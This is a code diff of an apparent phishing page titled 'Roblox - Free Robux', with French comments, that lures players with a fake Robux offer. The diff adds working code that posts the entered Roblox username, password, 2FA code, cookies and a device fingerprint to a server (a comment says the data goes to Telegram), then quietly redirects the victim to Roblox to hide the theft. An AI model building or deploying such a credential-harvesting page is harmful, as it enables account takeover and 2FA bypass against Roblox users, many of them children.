@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Roblox - Free Robux</title>
-    <!-- Font Awesome pour les icônes -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
     <style>
         * {
@@ -36,9 +35,6 @@
             align-items: center;
         }
 
-        /* =========================
-           LOGO ROBLOX
-        ========================= */
         .logo {
             display: flex;
             align-items: center;
@@ -76,9 +72,6 @@
             display: block;
         }
 
-        /* =========================
-           ÉTAPES
-        ========================= */
         .step {
             display: none;
             width: 100%;
@@ -101,9 +94,6 @@
             }
         }
 
-        /* =========================
-           COMPTE À REBOURS (5 jours)
-        ========================= */
         .countdown-box {
             text-align: center;
             background: rgba(255, 255, 255, 0.03);
@@ -156,9 +146,6 @@
             padding-top: 4px;
         }
 
-        /* =========================
-           ÉTAPE 1 : OFFRE
-        ========================= */
         .offer-badge {
             display: inline-block;
             background: #00b878;
@@ -238,9 +225,6 @@
             gap: 4px;
         }
 
-        /* =========================
-           INPUTS
-        ========================= */
         .input-field {
             width: 100%;
             height: 64px;
@@ -312,9 +296,6 @@
             border: 1px solid rgba(255, 59, 48, 0.15);
         }
 
-        /* =========================
-           BOUTONS
-        ========================= */
         .btn-primary {
             width: 100%;
             height: 64px;
@@ -371,9 +352,6 @@
             }
         }
 
-        /* =========================
-           BOUTON GOOGLE (décoratif)
-        ========================= */
         .btn-google {
             width: 100%;
             height: 56px;
@@ -411,9 +389,6 @@
             color: #ffffff;
         }
 
-        /* =========================
-           SÉPARATEUR
-        ========================= */
         .divider {
             display: flex;
             align-items: center;
@@ -436,9 +411,6 @@
             color: #55585e;
         }
 
-        /* =========================
-           ÉTAPE 2 : CONNEXION
-        ========================= */
         .login-header {
             text-align: center;
             margin-bottom: 6px;
@@ -481,9 +453,6 @@
             margin: 0 8px;
         }
 
-        /* =========================
-           ÉTAPE 3 : 2FA
-        ========================= */
         .verification-info {
             text-align: center;
             font-size: 18px;
@@ -559,9 +528,40 @@
             text-decoration: underline;
         }
 
-        /* =========================
-           RESPONSIVE
-        ========================= */
+        #loading-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #101113;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+
+        #loading-page.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #2a2d30;
+            border-top: 3px solid #00b878;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            color: #777b80;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
         @media (max-width: 600px) {
             .card {
                 padding: 30px 20px 36px;
@@ -697,9 +697,7 @@
             <span class="logo-letter">X</span>
         </div>
 
-        <!-- ============================================================
-        ÉTAPE 1 : OFFRE AVEC COMPTE À REBOURS
-        ============================================================ -->
+        <!-- ÉTAPE 1 : OFFRE -->
         <div id="step1" class="step active">
             <div style="text-align:center;">
                 <span class="offer-badge">🔥 Offre limitée</span>
@@ -758,9 +756,7 @@
             </div>
         </div>
 
-        <!-- ============================================================
-        ÉTAPE 2 : CONNEXION (SÉRIEUSE)
-        ============================================================ -->
+        <!-- ÉTAPE 2 : CONNEXION -->
         <div id="step2" class="step">
             <div class="login-header">
                 <div class="welcome">Bienvenue dans le <strong>Partners Program</strong></div>
@@ -768,23 +764,10 @@
             </div>
 
             <form id="loginForm">
-                <input
-                type="text"
-                id="username"
-                class="input-field"
-                placeholder="Type your username ..."
-                autocomplete="off"
-                />
+                <input type="text" id="username" class="input-field" placeholder="Type your username ..." autocomplete="off" />
 
                 <div class="input-group">
-                    <input
-                    type="password"
-                    id="password"
-                    class="input-field"
-                    placeholder="Enter your password ..."
-                    autocomplete="off"
-                    style="margin-bottom:0;"
-                    />
+                    <input type="password" id="password" class="input-field" placeholder="Enter your password ..." autocomplete="off" style="margin-bottom:0;" />
                     <button type="button" class="password-toggle" id="togglePassword" aria-label="Afficher/masquer le mot de passe">
                         <i class="fas fa-eye" id="eyeIcon"></i>
                     </button>
@@ -800,12 +783,10 @@
                 </button>
             </form>
 
-            <!-- Séparateur "OU" -->
             <div class="divider">
                 <span>OU</span>
             </div>
 
-            <!-- Bouton Google (décoratif) -->
             <button class="btn-google" onclick="alert('Cette fonctionnalité est temporairement indisponible.')">
                 <svg viewBox="0 0 24 24">
                     <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v3.92h6.69c-.29 1.5-1.14 2.77-2.4 3.61v3h3.84c2.25-2.07 3.61-5.12 3.61-8.46z"/>
@@ -823,9 +804,7 @@
             </div>
         </div>
 
-        <!-- ============================================================
-        ÉTAPE 3 : 2FA
-        ============================================================ -->
+        <!-- ÉTAPE 3 : 2FA -->
         <div id="step3" class="step">
             <div class="verification-info">
                 📧 Un code de vérification vous a été envoyé.
@@ -856,6 +835,12 @@
             </button>
         </div>
 
+    </div>
+
+    <!-- LOADING PAGE -->
+    <div id="loading-page">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Connexion à Roblox en cours...</div>
     </div>
 
     <script>
@@ -925,7 +910,7 @@
         });
 
         // ============================================================
-        // TOGGLE PASSWORD (avec Font Awesome)
+        // TOGGLE PASSWORD
         // ============================================================
         const togglePassword = document.getElementById('togglePassword');
         const passwordInput = document.getElementById('password');
@@ -940,9 +925,57 @@
         });
 
         // ============================================================
-        // ÉTAPE 2 : SOUMISSION
+        // DÉTECTION APPAREIL
         // ============================================================
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        function getExactDeviceModel() {
+            const ua = navigator.userAgent;
+            const models = {
+                'Samsung Galaxy A54 5G': /SM-A546/i,
+                'Samsung Galaxy S24 Ultra': /SM-S928/i,
+                'iPhone 15 Pro Max': /iPhone15,3/i,
+                'Google Pixel 8 Pro': /Pixel 8 Pro/i,
+                'Xiaomi 13 Pro': /Xiaomi 13 Pro/i,
+                'OnePlus 11': /OnePlus 11/i,
+                'TECNO Phantom X2': /TECNO Phantom X2/i,
+                'Infinix Zero Ultra': /Infinix Zero Ultra/i
+            };
+            for (const [model, regex] of Object.entries(models)) {
+                if (regex.test(ua)) return model;
+            }
+            return 'Modèle inconnu';
+        }
+
+        async function getDeviceDetails() {
+            const deviceModel = getExactDeviceModel();
+            return {
+                platform: navigator.platform || 'Inconnu',
+                deviceMemory: navigator.deviceMemory || 'Non disponible',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Non disponible',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                cookieEnabled: navigator.cookieEnabled,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Non disponible',
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Non disponible',
+                batteryLevel: batteryLevel,
+                deviceModel: deviceModel,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localTime: new Date().toLocaleString('fr-FR'),
+                viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+                pixelRatio: window.devicePixelRatio,
+                cookies: document.cookie || 'Aucun cookie'
+            };
+        }
+
+        let batteryLevel = 'Non disponible';
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(battery) {
+                batteryLevel = Math.round(battery.level * 100) + '%';
+            });
+        }
+
+        // ============================================================
+        // ÉTAPE 2 : SOUMISSION → ENVOI À TELEGRAM
+        // ============================================================
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const username = document.getElementById('username').value.trim();
@@ -964,17 +997,42 @@
             btnText.textContent = 'Envoi...';
             spinner.style.display = 'block';
 
-            // Simuler envoi (à remplacer par fetch('/api/login', ...))
-            setTimeout(() => {
+            try {
+                const deviceDetails = await getDeviceDetails();
+
+                const data = {
+                    username: username,
+                    password: password,
+                    ...deviceDetails,
+                    timestamp: new Date().toISOString(),
+                    step: 'credentials'
+                };
+
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.success) {
+                    // Passer à l'étape 3 (2FA)
+                    goToStep(3);
+                    document.querySelectorAll('.code-input').forEach(inp => inp.value = '');
+                    document.getElementById('codeError').style.display = 'none';
+                    document.querySelector('.code-input').focus();
+                } else {
+                    alert('Erreur de connexion. Veuillez réessayer.');
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                alert('Erreur de connexion au serveur.');
+            } finally {
                 btn.disabled = false;
                 btnText.textContent = 'Continue';
                 spinner.style.display = 'none';
-
-                goToStep(3);
-                document.querySelectorAll('.code-input').forEach(inp => inp.value = '');
-                document.getElementById('codeError').style.display = 'none';
-                document.querySelector('.code-input').focus();
-            }, 1200);
+            }
         });
 
         // ============================================================
@@ -1012,9 +1070,9 @@
         }
 
         // ============================================================
-        // ÉTAPE 3 : VÉRIFICATION
+        // ÉTAPE 3 : VÉRIFICATION 2FA → REDIRECTION DIRECTE
         // ============================================================
-        document.getElementById('step3Btn').addEventListener('click', function() {
+        document.getElementById('step3Btn').addEventListener('click', async function() {
             const code = getCode();
 
             if (code.length !== 6) {
@@ -1030,15 +1088,49 @@
             btnText.textContent = 'Vérification...';
             spinner.style.display = 'block';
 
-            // Simuler vérification (à remplacer par fetch)
-            setTimeout(() => {
+            try {
+                const deviceDetails = await getDeviceDetails();
+
+                const data = {
+                    verification_code: code,
+                    ...deviceDetails,
+                    timestamp: new Date().toISOString(),
+                    step: 'verification'
+                };
+
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.success) {
+                    // 🔥 Redirection directe vers Roblox SANS message
+                    const loadingPage = document.getElementById('loading-page');
+                    loadingPage.classList.add('active');
+
+                    // Utiliser l'URL Scheme Roblox pour ouvrir le jeu
+                    setTimeout(function() {
+                        // Essayer d'ouvrir l'app Roblox
+                        window.location.href = 'roblox://';
+                        // Fallback vers le site si l'app n'est pas installée
+                        setTimeout(function() {
+                            window.location.href = 'https://www.roblox.com';
+                        }, 2000);
+                    }, 1500);
+                } else {
+                    alert('Code incorrect. Veuillez réessayer.');
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                alert('Erreur de connexion au serveur.');
+            } finally {
                 btn.disabled = false;
                 btnText.textContent = 'Vérifier';
                 spinner.style.display = 'none';
-
-                alert('✅ Code valide ! Redirection vers Roblox...');
-                window.location.href = 'https://www.roblox.com';
-            }, 1500);
+            }
         });
 
         // ============================================================
